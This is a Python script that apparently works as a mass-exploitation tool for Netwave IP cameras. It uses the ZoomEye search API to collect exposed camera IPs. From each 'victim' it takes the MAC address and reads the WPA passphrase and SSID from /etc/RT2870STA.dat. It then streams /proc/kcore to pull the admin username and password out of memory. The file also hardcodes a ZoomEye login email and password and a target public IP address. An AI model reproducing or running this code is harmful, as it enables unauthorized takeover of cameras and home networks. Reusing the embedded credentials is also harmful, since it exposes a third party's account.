# -*- coding:utf-8 -*-
# todo remove all the thirdparty library
import requests
import json
import re
import urllib
from urllib.request import urlopen
from urllib.error import HTTPError
import os
from log import logger

is_stopped = False
mac_pattern = re.compile("(?<=id\=\').*?(?=\')")
string_pattern = re.compile(b'[^\x00-\x1F\x7F-\xFF]{4,}')


# trans data from zoomeye to the format we want
def trans(match):
    return {
        "ip_addr": "%s:%s" % (match["ip"], match["portinfo"]["port"]),
        "lat": match["geoinfo"]["location"]["lat"],
        "lon": match["geoinfo"]["location"]["lon"],
        "addr": "%s, %s, %s" % (
            match["geoinfo"]["city"]["names"]["zh-CN"] or "unknowncity%s" % (repr(match["geoinfo"]["city"]["geoname_id"])),
            match["geoinfo"]["country"]["names"]["zh-CN"], match["geoinfo"]["continent"]["names"]["zh-CN"]),
    }


# ip filter basically testing if can be "pinged"
def _verify(dev):
    ip = dev["ip_addr"]
    logger.info("getting system information of %s .." % ip)
    candi_url = "http://%s/get_status.cgi" % ip
    try:
        resp = requests.get(candi_url, timeout=10).text
    except requests.ConnectionError:
        logger.warning("%s isn't vulnerable..moving to next\n" % ip)
        return False
    mac = mac_pattern.search(resp)
    if mac:
        dev["mac_addr"] = mac.group()
    logger.critical("victims MAC-ADDRESS: %s " % dev["mac_addr"])

    logger.info("getting wireless information..")
    resp = requests.get("http://%s//etc/RT2870STA.dat" % ip)
    if resp.status_code != 200:
        # if it is disabled, addr is not reachable, assume it is safe
        logger.warning("wireless lan is disabled..")
    else:
        wireless_info = resp.text.split("\n")
        wireless_info.remove("")  # to beautify the output by reomve all blank lines
        logger.critical("victims wireless information..")
        for line in wireless_info:
            if line.startswith("WPAPSK") or line.startswith("SSID"):
                logger.critical(line)
            # else:
            #     logger.critical(line)

    logger.info("checking for memory dump vulnerability..")
    try:
        urlopen("http://%s//proc/kcore" % ip)
        logger.critical("%s is vulnerable for a memory leak\n\n" % ip)
        return True
    # fixme: urllib.error => catching classes that do not inherit from BaseException is not allowed
    except HTTPError as err:
        logger.warning("victim isnt vulnerable for a memory leak, moving to next..\n")
        return False


def _attack(dev):
    r = requests.get("http://%s//proc/kcore" % dev["ip_addr"], stream=True)
    mac_addr = dev["mac_addr"].encode()
    print(mac_addr)
    count = 0
    logger.info("start checking..")
    for line in r.iter_lines():
        count += 1
        try:
            if mac_addr in line:
                print(line)
                print(count)
                # monitor the function of strings
                candi = string_pattern.findall(line)
                print(candi)
                idx = candi.index(mac_addr)
                user = candi[idx+2].decode("ascii")
                passwd = candi[idx+3].decode("ascii")
                logger.info("possible username:%s, password:%s" % (user, passwd))
                dev["user"] = user
                dev["passwd"] = passwd
                dev["confirmed"] = False
                # if requests.get("http://%s/get_params.cgi?user=%s&pwd=%s" % (dev["ip_addr"], user, passwd)).status_code == 200:
                #     logger.info("confirmed")
                #     dev["confirmed"] = True
                return True
        # some may be b'ipcamera_006E0606CA89'
        except ValueError as err:
            print(err)
            continue
    return False


def login():
    data = {
        "username": "907937976@qq.com",
        "password": "bupt1210",
    }
    logger.info("retrieving access_token..")
    resp = json.loads(requests.post(url="https://api.zoomeye.org/user/login", data=json.dumps(data)).text)
    access_token = resp["access_token"]
    with open("../info/access_token.txt", "w") as f:
        f.write(access_token)
    logger.info("access_token is written in access_token.txt")


def get_dev_list():
    if not os.path.isfile("../info/access_token.txt"):
        logger.warning("no access_token")
        login()
    with open("../info/access_token.txt", "r") as f:
        access_token = f.read()

    page_number = 10
    headers = {"Authorization": "JWT " + access_token}
    ip_list = []
    for page in range(page_number):
        resp = json.loads(requests.get(
            url='https://api.zoomeye.org/host/search?query=app:"Netwave IP camera http config" &page=%s' % (page+1),
            headers=headers).text)
        if "error" in resp and resp["message"] == "Invalid Token, Signature has expired":
            logger.warning("token has expired, try to retrieve new token..")
            login()
        try:
            logger.info("get %s ip.." % ((page+1)*10))
            ip_list += [trans(x) for x in resp["matches"]]
        except KeyError as err:
            if err == "matches":
                logger.error("account was break, excceeding the max limitations")  # 有请求次数限制
                break
            else:
                logger.error("other keyerror")
    return ip_list

def teststop():
    global is_stopped
    is_stopped = True


if __name__ == "__main__":
    import logging
    logger = logging.getLogger("scantools")
    logger.setLevel(logging.INFO)
    dev = [{
        "ip_addr": "210.6.63.134",
        "mac_addr": "006E0606CA89"
    }]
    test = filter(_attack, dev)

    print(next(test))
